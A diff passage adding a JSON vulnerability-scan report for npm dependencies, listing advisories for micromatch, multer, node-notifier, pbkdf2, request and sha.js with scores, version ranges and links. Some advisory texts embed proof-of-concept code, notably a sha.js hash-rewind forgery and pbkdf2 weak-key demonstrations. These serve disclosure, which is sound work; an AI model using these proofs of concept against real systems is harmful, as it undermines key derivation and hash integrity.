+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.0.8"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-952p-6rrq-rcjv/GHSA-952p-6rrq-rcjv.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4067"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/issues/243"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/pull/247"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/pull/266"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://advisory.checkmarx.net/advisory/CVE-2024-4067"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4067"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/micromatch/micromatch"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/micromatch/releases/tag/4.0.8"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-08-21T22:58:52Z",
+                "nvd_published_at": "2024-05-14T15:42:47Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-952p-6rrq-rcjv"
+              ],
+              "aliases": [
+                "CVE-2024-4067",
+                "GHSA-952p-6rrq-rcjv"
+              ],
+              "max_severity": "5.3"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "multer",
+            "version": "2.0.1",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-07-17T21:44:33Z",
+              "published": "2025-07-17T21:01:54Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-fjgf-rc76-4x9p",
+              "aliases": [
+                "CVE-2025-7338"
+              ],
+              "summary": "Multer vulnerable to Denial of Service via unhandled exception from malformed request",
+              "details": "### Impact\n\nA vulnerability in Multer versions \u003e= 1.4.4-lts.1, \u003c 2.0.2 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed request. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\n\nUsers should upgrade to `2.0.2`\n\n### Workarounds\n\nNone",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "multer",
+                    "purl": "pkg:npm/multer"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "1.4.4-lts.1"
+                        },
+                        {
+                          "fixed": "2.0.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjgf-rc76-4x9p/GHSA-fjgf-rc76-4x9p.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/expressjs/multer/security/advisories/GHSA-fjgf-rc76-4x9p"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-7338"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/expressjs/multer/commit/adfeaf669f0e7fe953eab191a762164a452d143b"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/expressjs/multer"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-248"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-07-17T21:01:54Z",
+                "nvd_published_at": "2025-07-17T16:15:35Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-fjgf-rc76-4x9p"
+              ],
+              "aliases": [
+                "CVE-2025-7338",
+                "GHSA-fjgf-rc76-4x9p"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "node-notifier",
+            "version": "5.4.5",
+            "ecosystem": "npm"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "vulnerabilities": [
+            {
+              "modified": "2025-01-14T08:56:52Z",
+              "published": "2020-12-21T16:04:07Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-5fw9-fq32-wv5p",
+              "aliases": [
+                "CVE-2020-7789"
+              ],
+              "summary": "OS Command Injection in node-notifier",
+              "details": "This affects the package node-notifier before 8.0.1. It allows an attacker to run arbitrary commands on Linux machines due to the options params not being sanitised when being passed an array.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "node-notifier",
+                    "purl": "pkg:npm/node-notifier"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "8.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/12/GHSA-5fw9-fq32-wv5p/GHSA-5fw9-fq32-wv5p.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7789"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mikaelbr/node-notifier/commit/5d62799dab88505a709cd032653b2320c5813fce"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mikaelbr/node-notifier/blob/master/lib/utils.js%23L303"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1050371"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://snyk.io/vuln/SNYK-JS-NODENOTIFIER-1035794"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-78"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2020-12-17T23:00:02Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5fw9-fq32-wv5p"
+              ],
+              "aliases": [
+                "CVE-2020-7789",
+                "GHSA-5fw9-fq32-wv5p"
+              ],
+              "max_severity": "5.6"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "pbkdf2",
+            "version": "3.1.2",
+            "ecosystem": "npm"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "vulnerabilities": [
+            {
+              "modified": "2025-06-27T23:38:36Z",
+              "published": "2025-06-23T22:41:50Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-h7cp-r72f-jxh6",
+              "aliases": [
+                "CVE-2025-6545"
+              ],
+              "summary": "pbkdf2 returns predictable uninitialized/zero-filled memory for non-normalized or unimplemented algos",
+              "details": "### Summary\n\nThis affects both:\n 1. Unsupported algos (e.g. `sha3-256` / `sha3-512` / `sha512-256`)\n 2. Supported but non-normalized algos (e.g. `Sha256` / `Sha512` / `SHA1` / `sha-1` / `sha-256` / `sha-512`)\n\nAll of those work correctly in Node.js, but this polyfill silently returns highly predictable ouput\n\nUnder Node.js (only with `pbkdf2/browser` import, unlikely) / Bun (`pbkdf2` top-level import is affected), the memory is not zero-filled but is uninitialized, as `Buffer.allocUnsafe` is used\n\nUnder browsers, it just returns zero-filled buffers\n(Which is also critical, those are completely unacceptable as kdf output and ruin security)\n\n### Were you affected?\n\nThe full list of arguments that were **not** affected were literal:\n * `'md5'`\n * `'sha1'`\n * `'sha224'`\n * `'sha256'`\n * `'sha384'`\n * `'sha512'`\n * `'rmd160'`\n * `'ripemd160'`\n\nAny other arguments, e.g. representation variations of the above ones like `'SHA-1'`/`'sha-256'`/`'SHA512'` or  different algos like `'sha3-512'`/`'blake2b512'`, while supported on Node.js `crypto` module, returned predictable output on `pbkdf2` (or `crypto` browser/bundlers polyfill)\n\n---\n\nBeware of packages re-exporting this under a different signature, like (abstract):\n```js\nconst crypto = require('crypto')\nmodule.exports.deriveKey = (algo, pass, salt) =\u003e crypto.pbkdf2Sync(pass, salt, 2048, 64, algo)\n```\n\nIn this case, the resulting `deriveKey` method is also affected (to the same extent / conditions as listed here).\n\n### Environments\n\nThis affects `require('crypto')` in polyfilled mode (e.g. from `crypto-browserify`, `node-libs-browser`, `vite-plugin-node-polyfills`, `node-stdlib-browser`, etc. -- basically everything that bundles/polfyills `crypto`\n\n* In bundled code (e.g. Webpack / Vite / whatever), this affects `require('crypto')` and `require('pbkdf2')`\n* On Node.js, this does not affect `require('pbkdf2')` (or `require('crypto')` obviously), but affects `require('pbkdf2/browser')`\n* On Bun, this _does_ affect `require('pbkdf2')` _and_  `require('pbkdf2/browser')` (and returns uninitialized memory, often zeros / sparse flipped bytes)\n\n### PoC\n```js\nconst node = require('crypto')\nconst polyfill = require('pbkdf2/browser')\n\nconst algos = [\n  'sha3-512', 'sha3-256', 'SHA3-384',\n  'Sha256', 'Sha512', 'sha512-256',\n  'SHA1', 'sha-1',\n  'blake2b512',\n  'RMD160', 'RIPEMD-160', 'ripemd-160',\n]\nfor (const algo of algos) {\n  for (const { pbkdf2Sync } of [node, polyfill]) {\n    const key = pbkdf2Sync('secret', 'salt', 100000, 64, algo)\n    console.log(`${algo}: ${key.toString('hex')}`);\n  }\n}\n```\n\nOutput (odd lines are Node.js, even is `pbkdf2` module / polyfill):\n```\nsha3-512: de00370414a3251d6d620dc8f7c371644e5d7f365ab23b116298a23fa4077b39deab802dd61714847a5c7e9981704ffe009aee5bb40f6f0103fc60f3d4cedfb0\nsha3-512: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nsha3-256: 76bf06909b91e4c968700078ee36af92019d0839ab1fea2f345c6c8685074ca0179302633fbd84d22cff4f8744952b2d07edbfc9658e95d30fb4e93ee067c7c9\nsha3-256: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nSHA3-384: 2b2b41b73f9b7bcd023f709ea84ba3c29a88edc311b737856ba9e74a2d9a928f233eb8cb404a9ba93c276edf6380c692140024a0bc12b75bfa38626207915e01\nSHA3-384: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nSha256: 3fa094211c0cf2ed1d332ab43adc69aab469f0e0f2cae6345c81bb874eef3f9eb2c629052ec272ca49c2ee95b33e7ba6377b2317cd0dacce92c4748d3c7a45f0\nSha256: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nSha512: 3745e482c6e0ade35da10139e797157f4a5da669dad7d5da88ef87e47471cc47ed941c7ad618e827304f083f8707f12b7cfdd5f489b782f10cc269e3c08d59ae\nSha512: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nsha512-256: e423f61987413121418715d0ebf64cb646042ae9a09fe4fd2c764a4f186ba28cf70823fdc2b03dda67a0d977c6f0a0612e5ed74a11e6f32b033cb658fa9f270d\nsha512-256: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nSHA1: 0e24bc5a548b236e3eb3b22317ef805664a88747c725cd35bfb0db0e4ae5539e3ed5cd5ba8c0ac018deb6518059788c8fffbe624f614fbbe62ba6a6e174e4a72\nSHA1: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nsha-1: 0e24bc5a548b236e3eb3b22317ef805664a88747c725cd35bfb0db0e4ae5539e3ed5cd5ba8c0ac018deb6518059788c8fffbe624f614fbbe62ba6a6e174e4a72\nsha-1: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nblake2b512: d3d661100c5ffb79bdf3b5c77d1698e621414cba40e2348bd3f1b10fbd2fe97bff4dc7d76474955bfefa61179f2a37e9dddedced0e7e79ef9d8c678080d45926\nblake2b512: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nRMD160: ec65dbad1485616cf0426725d64e009ad3e1633543746ccb56b7f06eb7ce51d0249aaef27c879f32911a7c0accdc83389c2948ddec439114f6165366f9b4cca2\nRMD160: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nRIPEMD-160: ec65dbad1485616cf0426725d64e009ad3e1633543746ccb56b7f06eb7ce51d0249aaef27c879f32911a7c0accdc83389c2948ddec439114f6165366f9b4cca2\nRIPEMD-160: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nripemd-160: ec65dbad1485616cf0426725d64e009ad3e1633543746ccb56b7f06eb7ce51d0249aaef27c879f32911a7c0accdc83389c2948ddec439114f6165366f9b4cca2\nripemd-160: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n```\n\n#### Uninitialized memory\n\n```js\nconst { pbkdf2Sync } = require('pbkdf2/browser') // or just 'pbkdf2' on Bun will do this too\n\nlet prev\nfor (let i = 0; i \u003c 100000; i++) {\n  const key = pbkdf2Sync('secret', 'salt', 100000, 64, 'sha3-256')\n  const hex = key.toString('hex')\n  if (hex !== prev) console.log(hex);\n  prev = hex\n}\n```\n\n### Affected versions\n\nSeems to be since https://github.com/browserify/pbkdf2/commit/9699045c37a07f8319cfb8d44e2ff4252d7a7078\n\n### Impact\n\nThis is critical, browserifying code might silently generate zero-filled keys instead of proper ones, for code that was working on Node.js or in test environment\n\nJust updating to a fixed version is not enough: if anyone was using `pbkdf2` lib (e.g. via `crypto-browserify` or directly) on algos not from the literal string list (see \"were you affected\"), recheck where those keys went / how they were used,  and take action accordingly\n\n### Note\n\nMost likely, you receive this either through a subdep using `pbkdf2` module directly (and then it is used), or through `crypto-browserify` (and the usage depends on whether you or any of your subdeps were calling `pbkdf2/pbkdf2Sync` methods from Node.js crypto inside your bundle)\n\nWhen targeting non-Node.js, prever avoiding Node.js crypto polyfill at all, and use `crypto.subtle` and/or modern/audited cryptography primitives instead",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:H/VA:N/SC:H/SI:H/SA:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "pbkdf2",
+                    "purl": "pkg:npm/pbkdf2"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.10"
+                        },
+                        {
+                          "fixed": "3.1.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 3.1.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-h7cp-r72f-jxh6/GHSA-h7cp-r72f-jxh6.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/browserify/pbkdf2/security/advisories/GHSA-h7cp-r72f-jxh6"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-6545"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/browserify/pbkdf2/commit/9699045c37a07f8319cfb8d44e2ff4252d7a7078"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/browserify/pbkdf2/commit/e3102a8cd4830a3ac85cd0dd011cc002fdde33bb"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/browserify/pbkdf2"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-20"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-06-23T22:41:50Z",
+                "nvd_published_at": "2025-06-23T19:15:25Z",
+                "severity": "CRITICAL"
+              }
+            },
+            {
+              "modified": "2025-06-23T23:42:18Z",
+              "published": "2025-06-23T22:42:00Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-v62p-rq8g-8h59",
+              "aliases": [
+                "CVE-2025-6547"
+              ],
+              "summary": "pbkdf2 silently disregards Uint8Array input, returning static keys",
+              "details": "### Summary\n\nOn historic but declared as supported Node.js versions (0.12-2.x), pbkdf2 silently disregards Uint8Array input\n\nThis only affects Node.js \u003c3.0.0, but `pbkdf2` claims to:\n * Support Node.js [\u003e= 0.12](https://github.com/browserify/pbkdf2/blob/v3.1.2/package.json#L62) (and there seems to be ongoing effort in this repo to maintain that)\n * Support `Uint8Array` input (input is typechecked against Uint8Array, and the error message includes e.g. \"Password must be a string, a Buffer, a typed array or a DataView\"\n\n### Details\n\nThe error is in `toBuffer` method\n\nThis vulnerability somehow even made it to tests: https://github.com/browserify/pbkdf2/commit/eb9f97a66ed83836bebc4ff563a1588248708501\nThere, `resultsOld` (where mismatch `results`) are just invalid output generated from empty password/salt instead of the supplied one\n\n### PoC\n\nOn Node.js/io.js \u003c 3.0.0\n\n```console\n\u003e require('pbkdf2').pbkdf2Sync(new Uint8Array([1,2,3]), new Uint8Array([1,3,4]), 1024, 32, 'sha256')\n\u003cBuffer 21 53 cd 5b a5 f0 15 39 2f 68 e2 40 8b 21 ba ca 0e dc 7b 20 d5 45 a4 8a ea b5 95 9f f0 be bf 66\u003e\n\n// But that's just a hash of empty data with empty password:\n\u003e require('pbkdf2').pbkdf2Sync('', '', 1024, 32, 'sha256')\n\u003cBuffer 21 53 cd 5b a5 f0 15 39 2f 68 e2 40 8b 21 ba ca 0e dc 7b 20 d5 45 a4 8a ea b5 95 9f f0 be bf 66\u003e\n\n// Node.js crypto is fine even on that version:\n\u003e require('crypto').pbkdf2Sync(new Uint8Array([1,2,3]), new Uint8Array([1,3,4]), 1024, 32, 'sha256')\n\u003cBuffer 78 10 cc 84 b7 bb 85 cd c8 37 ca 68 da a9 4c 33 db ae c2 3d 5b d4 95 76 da 33 f9 95 ac 51 f4 45\u003e\n\n// Empty hash from Node.js, for comparison\n\u003e require('crypto').pbkdf2Sync('', '', 1024, 32, 'sha256')\n\u003cBuffer 21 53 cd 5b a5 f0 15 39 2f 68 e2 40 8b 21 ba ca 0e dc 7b 20 d5 45 a4 8a ea b5 95 9f f0 be bf 66\u003e\n```\n\n### Impact\n\nStatic hashes being outputted and used as keys/passwords can completely undermine security\nThat said, no one should be using those Node.js versions anywhere now, so I would recommend to just drop them\nThis lib should not pretend to work on those versions while outputting static data though\n\nJust updating to a fixed version is not enough: if anyone was using `pbkdf2` lib (do not confuse with Node.js `crypto.pbkdf2`) or anything depending on it with Node.js/io.js \u003c 3.0.0, recheck where those keys went / how they were used,  and take action accordingly",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:H/SI:H/SA:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "pbkdf2",
+                    "purl": "pkg:npm/pbkdf2"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.1.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 3.1.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v62p-rq8g-8h59/GHSA-v62p-rq8g-8h59.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/browserify/pbkdf2/security/advisories/GHSA-v62p-rq8g-8h59"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-6547"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/browserify/pbkdf2/commit/e3102a8cd4830a3ac85cd0dd011cc002fdde33bb"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/browserify/pbkdf2"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-20"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-06-23T22:42:00Z",
+                "nvd_published_at": "2025-06-23T19:15:25Z",
+                "severity": "CRITICAL"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-h7cp-r72f-jxh6"
+              ],
+              "aliases": [
+                "CVE-2025-6545",
+                "GHSA-h7cp-r72f-jxh6"
+              ],
+              "max_severity": "9.1"
+            },
+            {
+              "ids": [
+                "GHSA-v62p-rq8g-8h59"
+              ],
+              "aliases": [
+                "CVE-2025-6547",
+                "GHSA-v62p-rq8g-8h59"
+              ],
+              "max_severity": "9.1"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "request",
+            "version": "2.88.2",
+            "ecosystem": "npm"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "vulnerabilities": [
+            {
+              "modified": "2024-03-21T17:47:20Z",
+              "published": "2023-03-16T15:30:19Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-p8p7-x288-28g6",
+              "aliases": [
+                "CVE-2023-28155"
+              ],
+              "related": [
+                "CGA-qqwm-8ppm-96fx",
+                "CGA-rw88-hxpr-jw8v"
+              ],
+              "summary": "Server-Side Request Forgery in Request",
+              "details": "The `request` package through 2.88.2 for Node.js and the `@cypress/request` package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).\n\nNOTE: The `request` package is no longer supported by the maintainer.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "request",
+                    "purl": "pkg:npm/request"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "last_affected": "2.88.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-p8p7-x288-28g6/GHSA-p8p7-x288-28g6.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@cypress/request",
+                    "purl": "pkg:npm/%40cypress/request"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.0.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.88.12",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-p8p7-x288-28g6/GHSA-p8p7-x288-28g6.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28155"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/request/request/issues/3442"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/cypress-io/request/pull/28"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/github/advisory-database/pull/2500"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/request/request/pull/3444"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/cypress-io/request/commit/c5bcf21d40fb61feaff21a0e5a2b3934a440024f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://doyensec.com/resources/Doyensec_Advisory_RequestSSRF_Q12023.pdf"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/cypress-io/request/blob/master/lib/redirect.js#L116"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/cypress-io/request/releases/tag/v3.0.0"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/request/request"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/request/request/blob/master/lib/redirect.js#L111"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.netapp.com/advisory/ntap-20230413-0007"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-918"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2023-03-16T18:33:48Z",
+                "nvd_published_at": "2023-03-16T15:15:00Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-p8p7-x288-28g6"
+              ],
+              "aliases": [
+                "CVE-2023-28155",
+                "GHSA-p8p7-x288-28g6"
+              ],
+              "max_severity": "6.1"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "sha.js",
+            "version": "2.4.11",
+            "ecosystem": "npm"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "vulnerabilities": [
+            {
+              "modified": "2025-09-13T04:47:06Z",
+              "published": "2025-08-21T14:47:55Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-95m3-7q98-8xr5",
+              "aliases": [
+                "CVE-2025-9288"
+              ],
+              "related": [
+                "CGA-85x6-mgf6-g6p2",
+                "CGA-p559-8m48-9hcq",
+                "CVE-2025-9288"
+              ],
+              "summary": "sha.js is missing type checks leading to hash rewind and passing on crafted data",
+              "details": "### Summary\n\nThis is the same as [GHSA-cpq7-6gpm-g9rc](https://github.com/browserify/cipher-base/security/advisories/GHSA-cpq7-6gpm-g9rc) but just for `sha.js`, as it has its own implementation.\n\nMissing input type checks can allow types other than a well-formed `Buffer` or `string`, resulting in invalid values, hanging and rewinding the hash state (including turning a tagged hash into an untagged hash), or other generally undefined behaviour.\n\n### Details\n\nSee PoC\n\n### PoC\n```js\nconst forgeHash = (data, payload) =\u003e JSON.stringify([payload, { length: -payload.length}, [...data]])\n\nconst sha = require('sha.js')\nconst { randomBytes } = require('crypto')\n\nconst sha256 = (...messages) =\u003e {\n  const hash = sha('sha256')\n  messages.forEach((m) =\u003e hash.update(m))\n  return hash.digest('hex')\n}\n\nconst validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whatever\n\nconst payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe')\nconst receivedMessage = JSON.parse(payload) // e.g. over network, whatever\n\nconsole.log(sha256(...validMessage))\nconsole.log(sha256(...receivedMessage))\nconsole.log(receivedMessage[0])\n```\n\nOutput:\n```\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\nHashed input means safe\n```\n\nOr just:\n```console\n\u003e require('sha.js')('sha256').update('foo').digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n\u003e require('sha.js')('sha256').update('fooabc').update({length:-3}).digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n```\n\n### Impact\n\n1. Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration)",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:H/SC:H/SI:H/SA:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "sha.js",
+                    "purl": "pkg:npm/sha.js"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.4.12"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.4.11",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-95m3-7q98-8xr5/GHSA-95m3-7q98-8xr5.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/browserify/sha.js/security/advisories/GHSA-95m3-7q98-8xr5"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-9288"
